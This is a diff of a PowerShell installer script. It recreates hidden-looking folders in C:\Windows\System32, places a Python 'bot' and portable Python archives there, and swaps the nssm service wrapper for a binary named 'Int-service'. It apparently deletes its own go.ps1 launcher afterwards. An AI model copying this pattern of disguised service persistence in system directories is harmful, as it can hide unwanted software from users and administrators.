@@ -1,8 +1,9 @@
-$destino = 'C:\Windows\System32\nssm.exe'
+$destino = 'C:\Windows\System32\Int-service.exe'
 $destino2 = 'C:\Windows\System32\ap32\bot.py'
 $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
 $destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
 $destino5 = 'C:\Windows\System32\ap32\scripts.zip'
+$destino6 = 'C:\Windows\System32\Int-service.xml'
 
 if (Test-Path "C:\Windows\System32\re-as") {
     Remove-Item "C:\Windows\System32\re-as" -Recurse -Force
@@ -12,8 +13,12 @@ if (Test-Path "C:\Windows\System32\ap32") {
     Remove-Item "C:\Windows\System32\ap32" -Recurse -Force
 }
 
-if (Test-Path "C:\Windows\System32\nssm.exe") {
-    Remove-Item "C:\Windows\System32\nssm.exe" -Force
+if (Test-Path "C:\Windows\System32\Int-service.exe") {
+    Remove-Item "C:\Windows\System32\Int-service.exe" -Force
+}
+
+if (Test-Path "C:\Windows\System32\Int-service.xml") {
+    Remove-Item "C:\Windows\System32\Int-service.xml" -Force
 }
 
 New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
@@ -44,3 +49,4 @@ if (Test-Path "C:\Windows\go.ps1") {
 }
 
 exit
+
